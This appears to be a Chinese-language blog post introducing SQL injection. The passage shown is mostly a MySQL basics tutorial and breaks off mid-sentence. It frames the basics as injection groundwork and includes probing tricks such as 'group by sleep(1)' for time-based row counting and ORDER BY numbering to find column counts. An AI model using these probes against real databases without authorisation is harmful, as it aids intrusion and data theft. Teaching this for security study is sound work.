[{"title":"深入浅出sql注入","url":"/3025/05/21/深入浅出sql注入/","content":"\n# 0x01sql注入前置\n\n讲这个知识之前我们得先问自己几个问题\n\n## 什么是数据库？\n\n简单来说，数据库就是“数据”的“仓库”。数据库是一个组织化的数据集合，用于存储、管理和检索信息。它为存储数据提供了一种格式化的方式，并允许用户和应用程序有效地查询、更新和管理这些数据。数据库中包含表、关系以及操作对象，数据存储在表中。\n\n## 什么是sql？\n\nSQL是结构化查询语言，是一种用于与关系数据库进行交互的标准编程语言。它用于定义、操作和控制数据，以及管理数据库。SQL 是一种高度通用的语言，几乎所有的数据库管理系统（RDBMS）都支持SQL，包括MySQL、PostgreSQL、Microsoft SQL Server 和 Oracle 等。\n\nsql里有四大最常见的操作，即**增删查改**：\n\n- 增。增加数据。其简单结构为: `INSERT table_name(columns_name) VALUES(new_values)`。\n- 删。删除数据。其简单结构为: `DELETE table_name WHERE condition`。\n- 查。查找数据。其简单结构为：`SELECT columns_name FROM table_name WHERE condition`。\n- 改。有修改/更新数据。简单结构为:`UPDATE table_name SET column_name=new_value WHERE condition`。\n\n## 什么是sql注入？\n\n**SQL注入：**是发生于应用程序和数据库层的安全漏洞，简而言之，是在输入的字符串之中**注入sql指令**，在设计不良的程序当中**忽略了字符检查**，那么这些注入进去的恶意指令就会被数据库服务器**误认为是正常的sql指令而运行**，因此遭到破坏或是入侵。这种漏洞可能**导致数据泄露、数据篡改、身份冒充和其他严重的安全问题**。\n\n# 0x02正文\n\n# MYSQL注入\n\n什么是mysql?\n\nMySQL 是一种开源的关系数据库管理系统（RDBMS），广泛用于存储和管理结构化数据。\n\n一个MySQL服务器可以有多个数据库，每个数据库可以独立管理，互不干扰。\n\n我们在讲解mysql注入之前，首先先要搭建一下mysql数据库\n\n## Linux中搭建Mysql服务\n\n```\nsudo su 进入root用户\nsudo apt update 更新所有软件包\nsudo apt install mysql-server 安装mysql\nsudo systemctl start mysql 启动mysql服务\nsudo systemctl restart mysql 重启mysql服务\nsudo systemctl stop mysql 关闭mysql服务\nsudo systemctl status mysql 查看mysql服务状态\nmysql --version 查看版本信息\nmysql -u root -p 登录连接数据库\n```\n\n连接数据库后会出现mysql的命令窗口（初始密码为空）\n\n![image-20250501135923222](../image/achieve/202411/sql深入浅出/image-20250501135923222.png)\n\n我们先看一下初始的数据库情况是什么样的\n\n## 0. SHOW列出数据库列表\n\n`show databases; `列出 MySQL 数据库管理系统的数据库列表。\n\n![image-20250501135942522](../image/achieve/202411/sql深入浅出/image-20250501135942522.png)\n\n1. **mysql**：存储用户权限、用户信息和其他管理相关的数据。\n2. **information_schema**：MySQL 中的一个系统数据库，它存储了关于数据库、表、列、索引、权限等元数据（metadata）的信息。\n\n里面的一些常用表：\n\n**`TABLES` 表**：存储数据库中所有表的信息。\n\n**常用字段**\n\n- `TABLE_SCHEMA`：表所属的数据库名称。\n- `TABLE_NAME`：表的名称。\n- `TABLE_TYPE`：表的类型（`BASE TABLE` 表示普通表，`VIEW` 表示视图）。\n- `ENGINE`：表的存储引擎（如 `InnoDB`、`MyISAM`）。\n- `TABLE_ROWS`：表中的行数（近似值）。\n- `CREATE_TIME`：表的创建时间。\n\n**`COLUMNS` 表**：存储数据库中所有表的列信息。\n\n**常用字段**\n\n- `TABLE_SCHEMA`：列所属的数据库名称。\n- `TABLE_NAME`：列所属的表名称。\n- `COLUMN_NAME`：列的名称。\n- `DATA_TYPE`：列的数据类型（如 `INT`、`VARCHAR`）。\n- `IS_NULLABLE`：列是否允许 `NULL` 值。\n- `COLUMN_DEFAULT`：列的默认值。\n- `CHARACTER_MAXIMUM_LENGTH`：字符类型列的最大长度。\n\n**`SCHEMATA` 表**：存储数据库中所有数据库的信息。\n\n**常用字段**\n\n- `SCHEMA_NAME`：数据库的名称。\n- `DEFAULT_CHARACTER_SET_NAME`：数据库的默认字符集。\n- `DEFAULT_COLLATION_NAME`：数据库的默认排序规则。\n\n3.**performance_schema**：用于监控 MySQL 服务器性能。\n\n4.**sys**：提供 MySQL 服务器的诊断和性能优化信息。\n\n接下来我们创建数据库\n\n## 1. 操作数据库\n\n### 1.1 CREATE创建和DROP删除数据库\n\n```\ncreate database [database_name]; 创建HELLOWORLD数据库\ndrop database [database_name];直接删除数据库\ndrop database if exists [database_name];先检查数据库是否存在在进行删除操作\n```\n\n我们创建个数据库helloworld\n\n![image-20250501154327821](../image/achieve/202411/sql深入浅出/image-20250501154327821.png)\n\n这里看到确实是有一个helloworld数据库，那我们对这个数据库进行操作\n\n### 1.2 USE指定操作数据库\n\n```\nuse [database_name]; 指定要进行操作的数据库\n```\n\n![image-20250501154828820](../image/achieve/202411/sql深入浅出/image-20250501154828820.png)\n\n选择数据库后，你的后续 SQL 查询和操作在指定的数据库 **helloworld** 上执行\n\n然后我们创建数据表\n\n## 2. 操作数据表\n\n我们先看一下创建的数据库里面的表是什么样的\n\n### 2.1 SHOW查看数据库中的表列表\n\n```\nshow tables; 查看当前数据库下的所有表\n```\n\n不过在未创建数据表的时候数据库的内容是空的\n\n![image-20250501154837240](../image/achieve/202411/sql深入浅出/image-20250501154837240.png)\n\n### 2.2 CREATE创建数据表\n\n创建 MySQL 数据表需要以下信息：\n\n- 表名\n- 表字段名\n- 定义每个表字段的数据类型\n\n语法\n\n```\nCREATE TABLE [table_name] (\n    column1 datatype,\n    column2 datatype,\n    ...\n);\n```\n\n**参数说明：**\n\n- `table_name` 是你要创建的表的名称。\n- `column1`, `column2`, ... 是表中的列名。\n- `datatype` 是每个列的数据类型。\n\n不过数据类型还没学，就返回来看了一下数据类型\n\n#### mysql数据类型\n\n内容摘录菜鸟教程:https://www.runoob.com/mysql/mysql-data-types.html\n\nMySQL 支持多种类型，大致可以分为三类：数值、日期/时间和字符串(字符)类型\n\n- 数值类型\n\n包括严格数值数据类型(INTEGER、SMALLINT、DECIMAL 和 NUMERIC)，以及近似数值数据类型(FLOAT、REAL 和 DOUBLE PRECISION)。\n\n| TINYINT      | 1 Bytes                                  | (-128，127)                                                  | (0，255)                                                     | 小整数值        |\n| ------------ | ---------------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ | --------------- |\n| SMALLINT     | 2 Bytes                                  | (-32 768，32 767)                                            | (0，65 535)                                                  | 大整数值        |\n| MEDIUMINT    | 3 Bytes                                  | (-8 388 608，8 388 607)                                      | (0，16 777 215)                                              | 大整数值        |\n| INT或INTEGER | 4 Bytes                                  | (-2 147 483 648，2 147 483 647)                              | (0，4 294 967 295)                                           | 大整数值        |\n| BIGINT       | 8 Bytes                                  | (-9,223,372,036,854,775,808，9 223 372 036 854 775 807)      | (0，18 446 744 073 709 551 615)                              | 极大整数值      |\n| FLOAT        | 4 Bytes                                  | (-3.402 823 466 E+38，-1.175 494 351 E-38)，0，(1.175 494 351 E-38，3.402 823 466 351 E+38) | 0，(1.175 494 351 E-38，3.402 823 466 E+38)                  | 单精度 浮点数值 |\n| DOUBLE       | 8 Bytes                                  | (-1.797 693 134 862 315 7 E+308，-2.225 073 858 507 201 4 E-308)，0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308) | 0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308) | 双精度 浮点数值 |\n| DECIMAL      | 对DECIMAL(M,D) ，如果M>D，为M+2否则为D+2 | 依赖于M和D的值                                               | 依赖于M和D的值                                               | 小数值          |\n\n- 日期和时间类型\n\n表示时间值的日期和时间类型为DATETIME、DATE、TIMESTAMP、TIME和YEAR\n\n| DATE      | 3    | 1000-01-01/9999-12-31                                        | YYYY-MM-DD          | 日期值                   |\n| --------- | ---- | ------------------------------------------------------------ | ------------------- | ------------------------ |\n| TIME      | 3    | '-838:59:59'/'838:59:59'                                     | HH:MM:SS            | 时间值或持续时间         |\n| YEAR      | 1    | 1901/2155                                                    | YYYY                | 年份值                   |\n| DATETIME  | 8    | '1000-01-01 00:00:00' 到 '9999-12-31 23:59:59'               | YYYY-MM-DD hh:mm:ss | 混合日期和时间值         |\n| TIMESTAMP | 4    | '1970-01-01 00:00:01' UTC 到 '2038-01-19 03:14:07' UTC结束时间是第 **2147483647** 秒，北京时间 **2038-1-19 11:14:07**，格林尼治时间 2038年1月19日 凌晨 03:14:07 | YYYY-MM-DD hh:mm:ss | 混合日期和时间值，时间戳 |\n\n- 字符串类型\n\n| 类型       | 大小                  | 用途                            |\n| :--------- | :-------------------- | :------------------------------ |\n| CHAR       | 0-255 bytes           | 定长字符串                      |\n| VARCHAR    | 0-65535 bytes         | 变长字符串                      |\n| TINYBLOB   | 0-255 bytes           | 不超过 255 个字符的二进制字符串 |\n| TINYTEXT   | 0-255 bytes           | 短文本字符串                    |\n| BLOB       | 0-65 535 bytes        | 二进制形式的长文本数据          |\n| TEXT       | 0-65 535 bytes        | 长文本数据                      |\n| MEDIUMBLOB | 0-16 777 215 bytes    | 二进制形式的中等长度文本数据    |\n| MEDIUMTEXT | 0-16 777 215 bytes    | 中等长度文本数据                |\n| LONGBLOB   | 0-4 294 967 295 bytes | 二进制形式的极大文本数据        |\n| LONGTEXT   | 0-4 294 967 295 bytes | 极大文本数据                    |\n\n以上就是我们的数据类型了，那我们接下来创建一个数据表\n\n```\nCREATE TABLE [table_name] (\n    column1 datatype,\n    column2 datatype,\n    ...\n);\ncreate table users(\nid int auto_increment primary key,\nusername varchar(50) not null,\npassword varchar(50) not null\n);\n```\n\n参数解释\n\n- `CREATE TABLE` 是用于创建新表的 SQL 语句。\n- `users` 是要创建的表的名称。\n- `id` 是表中的一个列名，用于唯一标识每个用户。\n- `INT` 表示该列的数据类型是整数。\n- `AUTO_INCREMENT` 表示该列会自动递增。每当插入一条新记录时，`id` 列会自动生成一个唯一的整数值，通常从 1 开始。\n- `PRIMARY KEY` 指定 `id` 列作为主键，确保每个用户的 `id` 是唯一的，且不能为 NULL。这意味着在 `users` 表中，每个用户都必须有一个唯一的 `id` 值。\n- - `username` 是表中的另一个列名，用于存储用户的用户名。\n  - VARCHAR(50)` 表示该列的数据类型为可变长度字符串，最大长度为 50 个字符。\n- - `NOT NULL` 表示该列不能为空，必须提供一个值。换句话说，用户必须输入用户名。\n- - `password` 是表中的第三个列名，用于存储用户的密码。\n- - `VARCHAR(100)` 表示该列的数据类型也是可变长度字符串，最大长度为 100 个字符。\n- - `NOT NULL` 同样表示该列不能为空，用户必须提供密码。\n\n然后我们可以看到是成功创建了一个users数据表的\n\n![image-20250501155323854](../image/achieve/202411/sql深入浅出/image-20250501155323854.png)\n\n查看一下数据表\n\n![image-20250501155400249](../image/achieve/202411/sql深入浅出/image-20250501155400249.png)\n\n### 2.3 RNAME修改和DROP删除表\n\n```\nRENAME TABLE [table_name] to [new table_name];修改表名\nDROP TABLE [table_name]; 直接删除表\nDROP TABLE IF EXISTS [table_name];  -- 会检查是否存在，如果存在则删除\n```\n\n![image-20250114135354948](../image/achieve/202411/sql注入--ctfshow/image-20250114135354948.png)\n\n创建数据表后，接下来我们就是向数据表中插入我们的数据了，我们先查看一下我们的字段\n\n## 3. 操作数据\n\n### 3.1 查询当前表下字段\n\n```\nshow full columns from 表名;查询当前表下所有字段信息\nshow columns from 表名; 显示数据表的属性，属性类型，主键信息 ，是否为 NULL，默认值等其他信息。\n```\n\n![image-20250501155537879](../image/achieve/202411/sql深入浅出/image-20250501155537879.png)\n\n插入数据的话通常用INSERT INTO SQL语法:\n\n### 3.2 INSERT添加数据\n\n```\nINSERT INTO table_name (column1, column2, column3, ...)\nVALUES (value1, value2, value3, ...);\n```\n\n**参数说明：**\n\n- `table_name` 是你要插入数据的表的名称。\n- `column1`, `column2`, `column3`, ... 是表中的列名。\n- `value1`, `value2`, `value3`, ... 是要插入的具体数值。\n\n**如果字段是字符型其数据必须加上单引号或者双引号**\n\n那我们插入一个数据看看\n\n```\ninsert into users (id,username,password)\n    -> value(1,\"wanth3f1ag\",\"123456\")\n    -> ;\n```\n\n解释来说就是插入了一行数据，id为1，username为wanth3f1ag，password为123456\n\n如果你要插入所有列的数据，可以省略列名\n\n```\nmysql> insert into users value(2,\"vu1n4bly\",\"admin123\");\n```\n\n如果你要插入多行数据，可以在 VALUES 子句中指定多组数值\n\n**注意：** 使用箭头标记 **->** 不是 SQL 语句的一部分，它仅仅表示一个新行，如果一条 SQL 语句太长，我们可以通过回车键来创建一个新行来编写 SQL 语句，SQL 语句的命令结束符为分号 **;**。\n\n那既然插入了数据那我们就试着去查询一下数据\n\n## 4. 查询数据\n\n### 4.1 SELECT查询数据\n\nmysql用SELECT语句来查询数据\n\n**在mysql中，windows下要区分单引号''和反引号``,(linux下不区分)：**\n\n**单引号主要用于字符串的引用，反引号主要用于数据库，表，索引，列，别名**\n\n语法\n\n```\nSELECT column1, column2, ...\nFROM table_name\n[WHERE condition]\n[ORDER BY column_name [ASC | DESC]]\n[LIMIT number];\n```\n\n**参数说明：**\n\n- `column1`, `column2`, ... 是你想要选择的列的名称，如果使用 `*` 表示选择所有列。\n- `table_name` 是你要从中查询数据的表的名称。\n- `WHERE condition` 是一个可选的子句，用于指定过滤条件，只返回符合条件的行。\n- `ORDER BY column_name [ASC | DESC]` 是一个可选的子句，用于指定结果集的排序顺序，默认是升序（ASC）。\n- `LIMIT number` 是一个可选的子句，用于限制返回的行数。\n\n例如我们查询所有列\n\n```\nSELECT * FROM users;\n```\n\n![image-20250501161209160](../image/achieve/202411/sql深入浅出/image-20250501161209160.png)\n\n也可以查询指定列\n\n```\nSELECT username,password FROM users;\n```\n\n![image-20250501161222713](../image/achieve/202411/sql深入浅出/image-20250501161222713.png)\n\n我们也可以添加where语句进行筛选符合条件的行\n\n```\nSELECT * FROM users WHERE id = 2;// 查询id为2对应的行\n```\n\n![image-20250501162603534](../image/achieve/202411/sql深入浅出/image-20250501162603534.png)\n\n我们还可以用LIMIT子语句限制返回的行数\n\n```\nSELECT * FROM users LIMIT 1;\n```\n\n![image-20250501162618206](../image/achieve/202411/sql深入浅出/image-20250501162618206.png)\n\n可以用ORDER BY 子语句去对指定列进行排列\n\n```\nSELECT * FROM users ORDER BY id;\n```\n\n默认是升序，DESC是降序\n\n```\nSELECT * FROM users ORDER BY id DESC;\n```\n\n但是SELECT语句是灵活的，我们可以根据实际需求去进行调整，这也是我们sql注入学习的前置，要对SELECT语句进行一定的了解才更有利于我们去进行sql注入的学习\n\n然后我们现在来学习一下WHERE子语句的一些相关利用\n\n## WHERE子语句\n\n`WHERE condition` 是用于指定过滤条件的子句。这些条件不仅限于我们的操作符(=,<,>,!=,<=,>=)，还可以用AND,OR指定一个或多个条件，模糊匹配(LIKE)等条件去匹配更精准的结果。\n\n| 操作符 | 描述                                                         | 实例                 |\n| :----- | :----------------------------------------------------------- | :------------------- |\n| =      | 等号，检测两个值是否相等，如果相等返回true                   | (A = B) 返回false。  |\n| <>, != | 不等于，检测两个值是否相等，如果不相等返回true               | (A != B) 返回 true。 |\n| >      | 大于号，检测左边的值是否大于右边的值, 如果左边的值大于右边的值返回true | (A > B) 返回false。  |\n| <      | 小于号，检测左边的值是否小于右边的值, 如果左边的值小于右边的值返回true | (A < B) 返回 true。  |\n| >=     | 大于等于号，检测左边的值是否大于或等于右边的值, 如果左边的值大于或等于右边的值返回true | (A >= B) 返回false。 |\n| <=     | 小于等于号，检测左边的值是否小于或等于右边的值, 如果左边的值小于或等于右边的值返回true | (A <= B) 返回 true。 |\n\n如果给定的条件在表中没有任何匹配的记录，那么查询不会返回任何数据。\n\n前面讲过数据库的基本操作是增删查改，那我们前面讲了如何增和删，那我们现在来讲一下怎么改，这时候就可以用到UPDATE命令了\n\n## 5. UPDATE更新数据\n\n如果我们需要修改或更新 MySQL 中的数据，我们可以使用 **UPDATE** 命令来操作。\n\n语句\n\n```mysql\nUPDATE table_name\nSET column1 = value1, column2 = value2, ...\nWHERE condition;\n```\n\n**参数说明：**\n\n- `table_name` 是你要更新数据的表的名称。\n- `column1`, `column2`, ... 是你要更新的列的名称。\n- `value1`, `value2`, ... 是新的值，用于替换旧的值。\n- `WHERE condition` 是一个可选的子句，用于指定更新的行。如果省略 `WHERE` 子句，将更新表中的所有行。\n\n当然，我们可以同时更新很多个字段，也可以在一个表中同时更新数据，当我们需要更新数据表中指定行的数据时 WHERE 子句是非常有用的。\n\n当然我们用表达式去更新数据的value也是可以的\n\n我们试一下\n\n1.更新单个列\n\n```\nUPDATE users SET username='wanth3f1ag' WHERE id=2;\n```\n\n![image-20250501162728136](../image/achieve/202411/sql深入浅出/image-20250501162728136.png)\n\n2.更新多个列\n\n```\nUPDATE users SET username='wanth3f1ag',password=123456 WHERE id=2;\n```\n\n![image-20250501162800467](../image/achieve/202411/sql深入浅出/image-20250501162800467.png)\n\n3.使用表达式\n\n```\nUPDATE users SET username='wanth3f1ag',password=123*2 WHERE id=2;\n```\n\n![image-20250501162818925](../image/achieve/202411/sql深入浅出/image-20250501162818925.png)\n\n4.更新所有行\n\n```\nUPDATE users SET password=123456;\n```\n\n![image-20250501162836667](../image/achieve/202411/sql深入浅出/image-20250501162836667.png)\n\n 5.更新嵌套查询\n\n```\nUPDATE users SET passwrod =(子查询语句) where子语句;\n```\n\n讲完了改的部分，我们来讲一下mysql中的删\n\n## 6.DELETE删除数据\n\n可以使用 **DELETE FROM** 命令来删除 MySQL 数据表中的记录\n\n语法\n\n```\nDELETE FROM table_name\nWHERE condition;\n```\n\n**参数说明：**\n\n- `table_name` 是你要删除数据的表的名称。\n- `WHERE condition` 是一个可选的子句，用于指定删除的行。如果省略 `WHERE` 子句，将删除表中的所有行。\n\n和update一样，可以用WHERE子语句去设置条件精准指定目标\n\n![image-20250501163025582](../image/achieve/202411/sql深入浅出/image-20250501163025582.png)\n\n## LIKE子语句和通配符\n\n用于进行模糊匹配的关键字。它通常与通配符(%)一起使用，用于搜索符合某种模式的字符串。\n\n%百分号表示任意字符，和我们unix中的*是一样的\n\n语法\n\n```\nSELECT column1, column2, ...\nFROM table_name\nWHERE column_name LIKE pattern;\n```\n\n**参数说明：**\n\n- `column1`, `column2`, ... 是你要选择的列的名称，如果使用 `*` 表示选择所有列。\n- `table_name` 是你要从中查询数据的表的名称。\n- `column_name` 是你要应用 `LIKE` 子句的列的名称。\n- `pattern` 是用于匹配的模式，可以包含通配符。\n\nLIKE子语句可以在WHERE子句中用，可以用来代替where子语句中的等号，**%** 通配符表示零个或多个字符。例如，**'a%'** 匹配以字母 **'a'** 开头的任何字符串。\n\n我们试一下\n\n假设我们有以下表\n\n![image-20250501163222396](../image/achieve/202411/sql深入浅出/image-20250501163222396.png)\n\n1.`%` 通配符表示零个或多个字符。例如，**'w%'** 匹配以字母 **'w'** 开头的任何字符串。\n\n```\nselect * from users where username like 'w%';\n```\n\n![image-20250501163307391](../image/achieve/202411/sql深入浅出/image-20250501163307391.png)\n\n2.`_ `通配符表示一个字符。例如，**'_a%'** 匹配第二个字母为 **'a'** 的任何字符串。\n\n```\nmysql> select * from users where username like '_u%';\n```\n\n![image-20250501163542370](../image/achieve/202411/sql深入浅出/image-20250501163542370.png)\n\n3.组合使用 `%` 和` _`，例如,`'w%a_'`表示第一个字符是w，然后是0或者无数个字符，接着是字符a，最后是匹配一个任意字符\n\n![image-20250117005436111](../image/achieve/202411/sql深入浅出/image-20250117005436111.png)\n\n以上就是我们用通配符进行模糊匹配的方法\n\n## 7.UNION联合查询操作\n\nUNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合，并去除重复的行。\n\n要求:必须由两个或多个 SELECT 语句组成，每个 SELECT 语句的列数和对应位置的数据类型必须相同。\n\n语法\n\n```mysql\nSELECT column1, column2, ... FROM table1 [WHERE condition1] UNION SELECT column1, column2, ... FROM table2 [WHERE condition2] [ORDER BY column1, column2, ...];\n```\n\n**参数说明：**\n\n- `column1`, `column2`, ... 是你要选择的列的名称，如果使用 `*` 表示选择所有列。\n- `table1`, `table2`, ... 是你要从中查询数据的表的名称。\n- `condition1`, `condition2`, ... 是每个 `SELECT` 语句的过滤条件，是可选的。\n- `ORDER BY` 子句是一个可选的子句，用于指定合并后的结果集的排序顺序。\n\n我们来试一下\n\n假如我们有以下表\n\n![image-20250501163930059](../image/achieve/202411/sql深入浅出/image-20250501163930059.png)\n\n然后我们用union去连接两个select查询语句,那么会得到:\n\n![image-20250501164023543](../image/achieve/202411/sql深入浅出/image-20250501164023543.png)\n\n可以看到这里已经将id和password的查询结果全部集合然后进行了一个排列\n\n但是我们要注意:*UNION 操作符在合并结果集时会去除重复行，而 UNION ALL 不会去除重复行*\n\n![image-20250501164225475](../image/achieve/202411/sql深入浅出/image-20250501164225475.png)\n\n我这里创建了一个密码和其他某个一样的密码，然后分别进行了union和union all联合查询，可以发现两个的结果和上面的知识点是一样的。\n\n- **()中的内容优先查询**\n\n子查询，优先执行`()`中的查询语句,其实这也是我们sql注入的关键点，通过优先级去将先执行的语句的结果当成后执行语句的参数参与执行查询\n\n## GROUP BY 子语句\n\nGROUP BY 语句根据一个或多个列对结果集进行分组。\n\n语法\n\n```\nSELECT column1, aggregate_function(column2)\nFROM table_name\nWHERE condition\nGROUP BY column1;\n```\n\n- `column1`：指定分组的列。\n- `aggregate_function(column2)`：对分组后的每个组执行的聚合函数。\n- `table_name`：要查询的表名。\n- `condition`：可选，用于筛选结果的条件。\n\ngroup by语句还可以用来探测数据的多少\n\n```\ngroup by sleep(1);\n```\n\n假设我这里有两条数据，那么就会延迟2s\n\n![image-20250507173534809](../image/achieve/202411/sql注入--ctfshow/image-20250507173534809.png)\n\n## ORDER BY 子语句\n\n**ORDER BY(排序)** 语句可以按照一个或多个列的值进行升序（**ASC**）或降序（**DESC**）排序。和group by一样，`group by`正常用在数据的分组。但是order by 和 group by 还可以用于实现判断数据表中的列数。\n\n![image-20250501164508719](../image/achieve/202411/sql深入浅出/image-20250501164508719.png)\n\n当`group by`后面的数字大于列数时，会产生报错。\n\n语法:\n\n```mysql\nSELECT column1, column2, ...\nFROM table_name\nORDER BY column1 [ASC | DESC], column2 [ASC | DESC], ...;\n```\n\n**参数说明：**\n\n- `column1`, `column2`, ... 是你要选择的列的名称，如果使用 `*` 表示选择所有列。\n- `table_name` 是你要从中查询数据的表的名称。\n- `ORDER BY column1 [ASC | DESC], column2 [ASC | DESC], ...` 是用于指定排序顺序的子句。`ASC` 表示升序（默认），`DESC` 表示降序。\n\n使用方法\n\n1.单列排序\n\n![image-20250117005809461](../image/achieve/202411/sql深入浅出/image-20250117005809461.png)\n\n2.多列排序\n\n```\nSELECT * FROM employees\nORDER BY department_id ASC, hire_date DESC;\n```\n\n3.使用数字表示列的位置\n\n```\nSELECT first_name, last_name, salary\nFROM employees\nORDER BY 3 DESC, 1 ASC;\n```\n\n按第三列（salary）降序 DESC 排序，然后按第一列（first_name）升序 ASC 排序。\n\n## group_concat()函数\n\n将数据合并到一行显示\n\n例如\n\n```\nselect group_concat(id,username,password) \nfrom users;\n```\n\n![image-20250501165205561](../image/achieve/202411/sql深入浅出/image-20250501165205561.png)\n\n## 8.JOIN左右连接\n\n这个的话是参考了一位师傅的文章：[MYSQL语法：左连接、右连接、内连接、全外连接](https://blog.csdn.net/u011047968/article/details/107744901)\n\nJOIN 按照功能大致分为如下：\n\n- left join（左连接）：返回包括左表中的所有记录和右表中连接字段相等的记录。\n- right join（右连接）：返回包括右表中的所有记录和左表中连接字段相等的记录。\n- inner join（内连接）：只返回两个表中连接字段相等的行。\n\n概念的话听起来不好理解，看看师傅给出的图示\n\n![image-20250502192842462](../image/achieve/202411/sql深入浅出/image-20250502192842462.png)\n\n### LEFT JOIN左连接\n\nLEFT JOIN 返回左表的所有行，并包括右表中匹配的行，如果右表中没有匹配的行，将返回 NULL 值\n\n语法：\n\n```\nSELECT column1, column2, ...\nFROM table1\nLEFT JOIN table2 ON table1.column_name = table2.column_name;\n```\n\n这里on后面的就是我们的连接条件\n\n我们本地测试一下\n\n先在本地创建两个表，之前有过一个users了，这里就再创建一个users2并插入数据\n\n![image-20250502194528555](../image/achieve/202411/sql深入浅出/image-20250502194528555.png)\n\n然后我们用左连接\n\n```\nselect * from users left join users2 on users.id = users2.id;\n```\n\n![image-20250502194621453](../image/achieve/202411/sql深入浅出/image-20250502194621453.png)\n\n这里返回了左表的所有和右表中和左表匹配的行，并且没有的地方返回NULL\n\n### RIGHT JOIN右连接\n\nRIGHT JOIN 返回右表的所有行，并包括左表中匹配的行，如果左表中没有匹配的行，将返回 NULL 值\n\n语法：\n\n```\nSELECT column1, column2, ...\nFROM table1\nRIGHT JOIN table2 ON table1.column_name = table2.column_name;\n```\n\n还是刚刚的例子，我们试一下\n\n![image-20250502194857297](../image/achieve/202411/sql深入浅出/image-20250502194857297.png)\n\n可以看到这里只匹配了左表的两行，而不会显示不匹配的行数据\n\n### inner join内连接\n\nINNER JOIN 返回两个表中满足连接条件的匹配行，相当于交集\n\n```\nSELECT column1, column2, ...\nFROM table1\nINNER JOIN table2 ON table1.column_name = table2.column_name;\n```\n\n我们试一下\n\n![image-20250502195047549](../image/achieve/202411/sql深入浅出/image-20250502195047549.png)\n\n可以看到这里和上面的右连接是一样的结果，这是因为我刚好把例子做的很类似，如果在user2加上一个不一样的行则右连接就会变成这样\n\n![image-20250502195204371](../image/achieve/202411/sql深入浅出/image-20250502195204371.png)\n\n## 9.运算符优先级\n\n![image-20250502174953509](../image/achieve/202411/sql注入--ctfshow/image-20250502174953509.png)\n\n## 10.regexp和rlike正则匹配\n\nREGEXP 和RLIKE用于检查一个字符串是否匹配指定的正则表达式模式\n\n![image-20250502200245616](../image/achieve/202411/sql深入浅出/image-20250502200245616.png)\n\n![image-20250502200230188](../image/achieve/202411/sql深入浅出/image-20250502200230188.png)\n\n语法：\n\n```\nSELECT column1, column2, ...\nFROM table_name\nWHERE column_name REGEXP 'pattern';\n```\n\n例如，\n\n查找 name 字段中以 **'st'** 为开头的所有数据\n\n```\nSELECT name FROM person_tbl WHERE name REGEXP '^st';\n```\n\n查找 name 字段中以 **'ok'** 为结尾的所有数据：\n\n```\nSELECT name FROM person_tbl WHERE name REGEXP 'ok$';\n```\n\n需要注意的是：MySQL 的正则表达式默认是**不区分大小写**的。如果需要区分大小写，可以使用 `BINARY` 关键字\n\n## 11.ALTER修改表和字段\n\nMySQL 的 **ALTER** 命令用于修改数据库、表和索引等对象的结构。\n\n**ALTER** 命令允许你添加、修改或删除数据库对象，并且可以用于更改表的列定义、添加约束、创建和删除索引等操作。\n\n- 添加列\n\n```\nALTER TABLE table_name\nADD COLUMN new_column_name datatype;\n```\n\n- 修改列的数据类型\n\n```\nALTER TABLE TABLE_NAME\nMODIFY COLUMN column_name new_datatype;\n```\n\n- 修改列名\n\n```\nALTER TABLE table_name\nCHANGE COLUMN old_column_name new_column_name datatype;\n```\n\n- 删除列\n\n```\nALTER TABLE table_name\nDROP COLUMN column_name;\n```\n\n- 修改表名\n\n```\nALTER TABLE old_table_name\nRENAME TO new_table_name;\n```\n\n## 12.MYSQL预处理语句\n\n简单来说就是预处理一个变量代表一个查询语句，用PREPARE 语句去预设一个语句，然后通过EXECUTE语句去执行预处理语句\n\n### PREPARE 语句\n\n语法\n\n```mysql\nPREPARE stmt_name FROM preparable_stmt\n```\n\nPREPARE 语句会准备一条sql语句，并为其指定一个变量名，而stmt_name可以作为我们后面需要执行该语句的时候的一个替换品，预处理语句使用 执行 `EXECUTE`，使用 释放 `DEALLOCATE PREPARE`。\n\n在语句中，`?` 字符可用作参数标记，用于指示稍后执行查询时数据值绑定到查询的位置\n\n需要注意的是，**此处的语句名称是不区分大小写的**，一会讲完预处理的知识点会进行测试的\n\n### EXECUTE 语句\n\n语法\n\n```\nEXECUTE stmt_name\n    [USING @var_name [, @var_name] ...]\n```\n\n使用 准备语句后 ，可以使用引用该准备好的语句名称的语句`PREPARE`来执行该语句 。如果准备好的语句包含任何参数标记，则必须提供一个 子句，列出包含要绑定到参数的值的用户变量。参数值只能由用户变量提供，并且子句中变量的名称必须与语句中参数标记的数量完全相同。\n\n### DEALLOCATE PREPARE 语句\n\n语法\n\n```\n{DEALLOCATE | DROP} PREPARE stmt_name\n```\n\n释放当前会话下生成的预处理语句 `PREPARE`\n\n我们本地测试一下\n\n```\nmysql> prepare a from 'select * from users where username = ?';\nQuery OK, 0 rows affected (0.00 sec)\nStatement prepared\n\nmysql> select * from users;\n+----+------------+----------+\n| id | username   | password |\n+----+------------+----------+\n|  1 | vu1n4bly   | 888888   |\n|  2 | wanth3f1ag | 123456   |\n|  3 | bao        | 3        |\n|  4 | man        | 1008611  |\n|  5 | _1         | 123      |\n+----+------------+----------+\n5 rows in set (0.00 sec)\n\nmysql> set @name = \"bao\";\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> execute a using @name;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  3 | bao      | 3        |\n+----+----------+----------+\n1 row in set (0.00 sec)\n```\n\n这里我测过，如果直接在execure中using字符串的话貌似是不行的\n\n然后我们看看大小写敏感问题\n\n```\nmysql> execute A using @name;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  3 | bao      | 3        |\n+----+----------+----------+\n1 row in set (0.00 sec)\n```\n\n可以看到这里是大小写不敏感的\n\n所以其实一整个预处理的语句的语法就是\n\n```\nPREPARE stmt_name FROM preparable_stmt;//定义预处理语句\nset @name = '';//定义语句中需要的变量\nexecute stmt_name using @name;//执行预处理语句\n{DEALLOCATE | DROP} PREPARE stmt_name//释放预处理语句\n```\n\n## 13.show status语句\n\n用 SHOW  STATUS 语句可以查看存储过程和函数的状态\n\n语法\n\n```\nSHOW    { PROCEDURE   |   FUNCTION   }  STATUS   [  LIKE  'pattern'  ]\n```\n\n   SHOW STATUS 语句是  MySQL 